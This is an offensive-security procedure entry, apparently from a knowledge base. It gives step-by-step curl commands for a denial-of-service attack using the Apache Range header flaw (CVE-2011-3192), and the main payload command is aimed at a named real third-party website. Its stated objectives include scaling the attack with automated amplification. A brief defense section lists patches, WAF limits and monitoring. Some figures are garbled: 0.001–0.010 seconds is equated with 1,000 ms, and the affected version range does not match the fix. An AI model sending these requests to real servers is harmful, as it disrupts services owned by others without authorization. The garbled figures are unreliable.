---
id: proc-uuid-002
tags:
  - dos
  - apache
  - range-header
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-normal-get]]'
  - '[[commands/curl-range-dos-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:37.008Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques:
  - '[[Direct Network Flood]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
---
# Test-Apache-Range-Header-DoS

## Summary

This procedure tests the CVE-2011-3192 vulnerability by sending a crafted HTTP GET request with a massive Range header containing overlapping byte ranges, measuring response time to confirm resource exhaustion on vulnerable Apache servers.

## Description

Targeted at Apache 2.2.17 or earlier, the procedure involves crafting a Range header like "bytes=0-,5-0,5-1,...5-1299" to force quadratic parsing overhead. A normal request to / takes ~1,000 ms, while the malicious one spikes to 50,000 ms due to excessive byte range processing. This is performed on public web servers like owncloud.com. Prerequisites: Confirmed vulnerable version and timing tools (e.g., curl -w). Outcomes include proof of DoS potential, scalable with concurrent requests.

## Requirements

1. Vulnerable Apache server accessible on port 80/443
2. curl with timing support
3. Ability to craft custom HTTP headers

## Defense

Defensive measures and detection strategies:

- Upgrade Apache to 2.2.20+ or apply patches for proper Range header handling
- Limit Range header size/complexity via mod_security or WAF rules
- Monitor for requests with multiple/large Range values and high CPU spikes

## Objectives

1. Validate DoS vulnerability through response time measurement
2. Demonstrate resource exhaustion without crashing the server initially
3. Prepare for automated amplification

## Instructions

### Step 1: Baseline Normal Response Time

**Context**: Establish a baseline by timing a standard GET request to the root path.

**Command** ([[commands/curl-normal-get]]):
```bash
curl -w "Total time: %{time_total}s\n" -o /dev/null -s http://owncloud.com/
```

> Outputs total response time, expected ~0.001-0.010 seconds (1,000 ms). This confirms normal server performance.

### Step 2: Send Malicious Range Header Request

**Context**: Craft and send the DoS request, timing it to observe delay.

**Command** ([[commands/curl-range-dos-test]]):
```bash
curl -H "Range: bytes=0-0,0-1,0-2,0-3,0-4,5-0,5-1,5-2,5-3,5-4,5-5,...[continue overlapping ranges up to 1300 entries]" -w "Total time: %{time_total}s\n" -o /dev/null -s http://owncloud.com/
```

> The header triggers excessive processing; expected output shows time up to 50 seconds, confirming the vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques

- [[Direct Network Flood]] HTTP Request Flood

## Commands Used

- [[commands/curl-normal-get]]
- [[commands/curl-range-dos-test]]

## Tools Used


## Tags

- dos
- apache
- range-header
